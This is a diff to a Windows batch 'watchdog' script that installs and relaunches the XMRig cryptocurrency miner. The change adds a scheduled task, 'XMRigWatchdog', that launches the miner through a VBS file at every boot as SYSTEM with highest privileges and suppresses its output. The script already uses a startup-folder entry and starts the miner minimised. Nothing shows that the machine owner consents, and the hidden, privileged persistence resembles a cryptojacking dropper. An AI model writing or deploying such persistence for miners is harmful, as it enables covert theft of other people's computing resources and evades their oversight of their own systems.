@@ -41,12 +41,20 @@ if '%errorlevel%' equ '0' (
     echo [!] Failed to add VBS to startup folder. Run this script manually after reboot. >> "%WATCHDOG_LOG%"
 )
 
+REM Also register a SYSTEM startup scheduled task for reliability
+schtasks /create /tn "XMRigWatchdog" /tr "wscript.exe \"%DEST%\start_miner.vbs\"" /sc onstart /ru SYSTEM /rl HIGHEST /f >nul 2>&1
+if '%errorlevel%' equ '0' (
+    echo [✔] Scheduled task 'XMRigWatchdog' created (runs at boot as SYSTEM). >> "%WATCHDOG_LOG%"
+) else (
+    echo [!] Failed to create scheduled task (it may already exist). >> "%WATCHDOG_LOG%"
+)
+
 REM === Start xmrig.exe ===
 echo [*] Starting xmrig.exe...
 echo [*] Starting xmrig.exe... >> "%WATCHDOG_LOG%"
 if exist "%DEST%\xmrig.exe" (
     cd /d "%DEST%"
-    start /min "" "%DEST%\xmrig.exe" --config="%DEST%\config.json" --randomx-1gb-pages --donate-level=0 --log-file="%LOG_FILE%" --print-time=60
+    start /min "" "%DEST%\xmrig.exe" --config="%DEST%\config.json"
     timeout /t 10 /nobreak >nul
     tasklist /fi "IMAGENAME eq xmrig.exe" | find "xmrig.exe" >nul
     if errorlevel 1 (
